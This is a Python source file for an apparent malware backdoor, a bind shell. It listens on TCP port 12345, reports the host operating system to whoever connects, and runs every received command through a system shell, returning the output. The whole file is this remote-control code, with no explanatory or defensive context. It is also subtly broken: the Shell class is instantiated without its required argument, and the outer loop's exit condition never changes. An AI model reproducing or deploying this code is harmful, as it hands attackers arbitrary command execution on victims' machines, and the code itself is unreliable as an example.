import socket
from subprocess import Popen, PIPE
import platform
import os


class Shell:
    command = ""
    next_command = True

    def __init__(self, malware_os):
        self._os = malware_os

    def receive(self):
        self.command = distant_socket.recv(4096).decode("utf-8")

    def execute_command(self):
        if self.command[:2] == "cd":
            os.chdir(self.command[3:])
            if self._os == "Windows":
                self.result = Popen("cd", shell=True, stdout=PIPE)
            else:
                self.result = Popen("pwd", shell=True, stdout=PIPE)
        else:
            self.result = Popen(self.command, shell=True, stdout=PIPE)

        self.response = self.result.communicate()

    def send(self):
        self.response = self.response[0]
        self.response = self.response.decode("utf-8")
        self.response = self.response + " "
        self.response = self.response.encode("utf-8")
        distant_socket.send(self.response)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
host_ip = socket.gethostbyname(host)
s.bind((host_ip, 12345))
s.listen(5)
distant_socket, addr = s.accept()
distant_socket.send("Welcome".encode("utf-8"))
message = distant_socket.recv(4096).decode("utf-8")
while message != "os":
    message = distant_socket.recv(4096).decode("utf-8")
distant_socket.send(platform.system().encode("utf-8"))
shell = Shell()
while message != "exit":
    while shell.next_command:
        if shell.command == "exit":
            shell.next_command = False
        else:
            shell.receive()
            shell.execute_command()
            shell.send()

s.close()
